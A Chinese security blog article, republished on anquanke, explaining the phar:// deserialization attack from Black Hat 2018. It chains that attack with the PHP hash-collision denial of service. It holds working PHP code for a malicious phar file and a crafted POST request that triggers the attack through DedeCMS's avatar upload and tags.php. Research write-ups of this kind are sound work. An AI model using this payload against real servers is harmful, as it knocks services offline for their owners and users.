# Blackhat议题解读 | phar反序列化

阅读量 **272216**

发布时间 : 2018-08-22 17:51:02

 **x**

##### 译文声明

本文是翻译文章

原文地址：<https://mp.weixin.qq.com/s/WKI87TXeWqJ_DdFjLiryZQ>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t018c9ed442b5bc2cad.png)

> 本文来自 ChaMd5安全团队审计组 呆哥，文章内容以思路为主。

## 引言

在Blackhat2018，来自Secarma的安全研究员Sam
Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。

## 漏洞原理

漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。其实这个漏洞点并不是第一次出现，早在hitcon2017就被Orange大佬用来出CTF题了（见baby^h-master-php-2017）。从PHP官方手册中我们可以看到Meta-data是用serialize()生成并保存在phar文件中的：

跟进PHP内核可以看到，当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。

## 漏洞利用

在Sam
Thomas的举出的例子中可以看到，该漏洞主要通过利用魔术方法__destruct或__wakeup构造利用链，但是在实战环境里往往较难找到可以直接通过魔术方法触发的漏洞点。由于通过反序列化可以产生任意一种数据类型，因此我想到了PHP的一个很古老的漏洞：PHP内核哈希表碰撞攻击（CVE-2011-4885）。在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1)
=>
O(n)）来触发拒绝服务攻击。PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。接下来的漏洞利用思路就很明显了：构造一串恶意的serialize数据（能够触发哈希表拒绝服务攻击），然后将其保存到phar文件的metadata数据区，当文件操作函数通过phar://协议对其进行操作的时候就会触发拒绝服务攻击漏洞！我们可以通过如下代码生成一个恶意的phar文件：

    
    
    <?php  
    set_time_limit(0);  
    $size= pow(2, 16);  
    $array = **array** ();  
     **for** ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {  
        $array[$key] = 0;  
    }  
    $new_obj = **new** stdClass;  
    $new_obj->hacker = $array;  
    $p = **new** Phar( ___DIR___. '/avatar.phar', 0);  
    $p['hacker.php'] = '<?php ?>';  
    $p->setMetadata($new_obj);  
    $p->setStub('GIF<?php __HALT_COMPILER();?>');  
    

然后通过如下代码测试拒绝服务攻击效果：

    
    
     **<?php  
    **set_time_limit(0);  
    $startTime = microtime( **true** );  
    file_exists("<phar://avatar.phar>");  
    $endTime = microtime( **true** );  
     **echo** '执行时间：  '.($endTime - $startTime). ' 秒';   
    

在我的机器上的测试效果：

## 漏洞实例复现

这里我要利用DedeCMS一个很出名的漏洞点，这个漏洞最初被用于探测后台目录，之后在“巅峰极客”比赛中被当做SSRF攻击利用，现在我要利用这个漏洞点构造phar反序列化来产生拒绝服务攻击！

首先通过织梦的头像上传点来上传phar文件（avatar.jpg）

文件位置： ** /member/edit_face.php**

由于DedeCMS默认的上传文件大小被限制为50K，所以我们要修改一下配置文件：

**找到\data\config.cache.inc.php，**

**把$cfg_max_face修改为5000**

上传成功后就会显示出文件的相对路径，然后直接构造如下数据包即可验证漏洞：

    
    
    POST /uploads/tags.php HTTP/1.1  
    Host: 127.0.0.1  
    Content-Type: application/x-www-form-urlencode  
    Content-Length: 136      
      
    dopost=save&_FILES[lsa][tmp_name]=<phar://uploads/userup/3/myface.jpg>&_FILES[lsa][name]=0&_FILES[lsa][size]=0&_FILES[lsa][type]=image/gif  
    

## 参考

**[1]**<https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/>

**[2]**<http://php.net/manual/en/book.phar.php>

**[3]**<https://blog.ripstech.com/2018/new-php-exploitation-technique/>

**[4]**<http://www.laruence.com/2011/12/30/2435.html>

**[5]**[https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It’s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)

本文翻译自 [原文链接](https://mp.weixin.qq.com/s/WKI87TXeWqJ_DdFjLiryZQ)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ChaMd5安全团队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/157439](/post/id/157439)

安全客 - 有思想的安全新媒体

本文转载自: [](https://mp.weixin.qq.com/s/WKI87TXeWqJ_DdFjLiryZQ)

如若转载,请注明出处： <https://mp.weixin.qq.com/s/WKI87TXeWqJ_DdFjLiryZQ>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Blackhat](/tag/Blackhat)
  * [反序列化](/tag/反序列化)
  * [phar](/tag/phar)

 **+1** __4赞

 __收藏

![](https://p0.ssl.qhimg.com/t01e150b8fd13828cb0.png) ChaMd5安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

